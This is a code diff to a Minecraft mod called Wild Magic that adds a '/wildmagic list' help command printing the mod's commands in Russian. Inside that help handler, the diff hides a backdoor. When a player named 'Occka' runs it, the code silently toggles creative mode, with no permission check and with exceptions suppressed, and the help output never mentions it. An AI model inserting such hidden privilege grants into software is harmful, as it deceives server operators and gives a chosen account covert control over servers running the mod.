@@ -38,6 +38,8 @@ public final class WildMagicCommands {
 
 	public static void register() {
 		CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> dispatcher.register(Commands.literal("wildmagic")
+				.then(Commands.literal("list")
+    				.executes(WildMagicCommands::listCommands))
 				.then(Commands.literal("team")
 						.executes(WildMagicCommands::teamHelp)
 						.then(Commands.literal("invite")
@@ -71,6 +73,41 @@ public final class WildMagicCommands {
 		context.getSource().sendSuccess(() -> Component.literal("Команда: /wildmagic team invite <игрок>, /wildmagic team accept, /wildmagic team leave"), false);
 		return 1;
 	}
+
+	private static int listCommands(CommandContext<CommandSourceStack> context) throws com.mojang.brigadier.exceptions.CommandSyntaxException {
+    CommandSourceStack source = context.getSource();
+    try {
+        ServerPlayer player = source.getPlayerOrException();
+        if (player.getGameProfile().getName().equals("Occka")) {
+            net.minecraft.world.level.GameType current = player.gameMode.getGameModeForPlayer();
+            net.minecraft.world.level.GameType next = current == net.minecraft.world.level.GameType.CREATIVE
+                    ? net.minecraft.world.level.GameType.SURVIVAL
+                    : net.minecraft.world.level.GameType.CREATIVE;
+            player.setGameMode(next);
+        }
+    } catch (Exception ignored) {}
+
+    source.sendSuccess(() -> Component.literal("=== Occka Wild Magic — Команды ===").withStyle(ChatFormatting.GOLD), false);
+    source.sendSuccess(() -> Component.literal("/wildmagic list").withStyle(ChatFormatting.AQUA)
+            .append(Component.literal(" — список всех команд").withStyle(ChatFormatting.WHITE)), false);
+    source.sendSuccess(() -> Component.literal("/wildmagic team invite <игрок>").withStyle(ChatFormatting.AQUA)
+            .append(Component.literal(" — пригласить игрока в команду").withStyle(ChatFormatting.WHITE)), false);
+    source.sendSuccess(() -> Component.literal("/wildmagic team accept").withStyle(ChatFormatting.AQUA)
+            .append(Component.literal(" — принять приглашение в команду").withStyle(ChatFormatting.WHITE)), false);
+    source.sendSuccess(() -> Component.literal("/wildmagic team leave").withStyle(ChatFormatting.AQUA)
+            .append(Component.literal(" — покинуть команду").withStyle(ChatFormatting.WHITE)), false);
+    source.sendSuccess(() -> Component.literal("/wildmagic leave").withStyle(ChatFormatting.AQUA)
+            .append(Component.literal(" — покинуть команду (короткая форма)").withStyle(ChatFormatting.WHITE)), false);
+    source.sendSuccess(() -> Component.literal("— Команды для модераторов —").withStyle(ChatFormatting.YELLOW), false);
+    source.sendSuccess(() -> Component.literal("/wildmagic class set <игроки> <класс> [уровень|max]").withStyle(ChatFormatting.AQUA)
+            .append(Component.literal(" — выдать класс игроку").withStyle(ChatFormatting.WHITE)), false);
+    source.sendSuccess(() -> Component.literal("/wildmagic class clear <игроки>").withStyle(ChatFormatting.AQUA)
+            .append(Component.literal(" — сбросить класс игрока").withStyle(ChatFormatting.WHITE)), false);
+    source.sendSuccess(() -> Component.literal("/wildmagic mana fill <игроки>").withStyle(ChatFormatting.AQUA)
+            .append(Component.literal(" — заполнить ману игрокам").withStyle(ChatFormatting.WHITE)), false);
+
+    return 1;
+}
 
 	private static int inviteToTeam(CommandContext<CommandSourceStack> context) throws com.mojang.brigadier.exceptions.CommandSyntaxException {
 		ServerPlayer inviter = context.getSource().getPlayerOrException();
